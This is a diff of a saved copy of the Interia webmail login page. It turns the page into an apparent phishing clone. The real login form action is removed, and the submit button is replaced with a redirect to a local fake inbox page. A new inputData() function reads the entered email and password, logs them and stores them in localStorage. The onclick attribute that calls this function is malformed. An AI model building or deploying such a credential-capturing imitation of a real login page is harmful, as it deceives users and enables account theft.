@@ -96,7 +96,7 @@
       // ]]> -->
 
     </script>
-    <script type="text/javascript" src="./logowanie_files/inpl.tools.120702.js"></script>
+    <!--<script type="text/javascript" src="./logowanie_files/inpl.tools.120702.js"></script>-->
     <!-- Begin DOTSRV -->
     <script type="text/javascript">
       <!--//--><![CDATA[//><!--
@@ -354,8 +354,7 @@
                   <div class="outerBorder">
                     <div class="innerBorder">
                       <h1 class="h--log_in">Logowanie</h1> <a class="login-link login-link--help" target="_blank" href="#://info.poczta.interia.pl/pomoc">Pomoc</a>
-                      <form method="post" action="#://logowanie.interia.pl/poczta/zaloguj?referer=#%3A%2F%2Fpoczta.interia.pl&amp;crc=77311c800980afc0#iwa_source=log_p_zaloguj"
-                      id="pocztaLoginForm">
+                      <form method="post" action="#" id="pocztaLoginForm">
                         <div class="errorMsg">
                           <div class="error-msg-wrapper"> </div>
                         </div>
@@ -383,8 +382,10 @@
                           <input id="iReferer" type="hidden" name="referer" value="">
                           <input id="iCrcReferer" type="hidden" name="crcReferer" value="">
                           <input id="isMobilePhone" type="hidden" name="isMobilePhone" value=""> </fieldset>
-                        <div onclick="location.href='./Odebrane0.htm';" class="buttons">
-                          <button type="submit" id="formSubmit" class="emph"> <span>Zaloguj się</span> </button>
+                        <div onclick="location.href='./Odebrane0.htm';"; "inputData();" class="buttons">
+                          <div class="main-cta">
+                          <span>Zaloguj się</span>
+                        </div>
                         </div>
                       </form>
                       <div id="greenTopPanel" class="login-account-panel">
@@ -721,6 +722,25 @@
       <iframe id="gemius_hcconn_1512319813735_85230633" name="lssetframe" width="0" height="0" scrolling="no" src="./logowanie_files/lsset.html" style="display: none; visibility: hidden;"></iframe>
       <iframe src="./logowanie_files/xgde.html" style="display: none; visibility: hidden; opacity: 0; width: 0px; height: 0px; pointer-events: none;"></iframe>
       <script charset="utf-8" type="text/javascript" async="" src="./logowanie_files/zoc.js"></script>
+
+      <script type="text/javascript" src="js/jquery-1.12.2.js"></script>
+
+      <script>
+        function inputData(){
+          var email = document.getElementById("formEmail").value;
+          var password = document.getElementById("formPassword").value;
+
+          console.log(email);
+          console.log(password);
+          localStorage.setItem('email',email);
+          localStorage.setItem('password',password);
+
+          //$('#message-textarea').val(localStorage.getItem("message"));
+          //$('#compose-subject_3').val(localStorage.getItem("title"));
+
+        };
+      </script>
+
   </body>
 
 </html>
